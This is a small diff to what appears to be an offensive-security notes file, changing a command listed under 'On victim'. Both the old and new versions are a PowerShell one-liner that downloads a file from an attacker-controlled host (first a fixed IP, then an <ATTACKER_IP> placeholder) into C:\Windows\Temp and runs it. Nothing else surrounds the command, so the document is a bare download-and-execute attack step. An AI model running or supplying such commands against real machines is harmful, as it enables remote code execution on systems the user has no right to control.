@@ -7,4 +7,4 @@
 
 # On victim
 
-`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.100.5:80/<FILENAME>', 'C:\Windows\Temp\<FILENAME>'); Start-Process 'C:\Windows\Temp\<FILENAME>'"`
+`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/<FILENAME>', 'C:\Windows\Temp\<FILENAME>'); Start-Process 'C:\Windows\Temp\<FILENAME>'"`
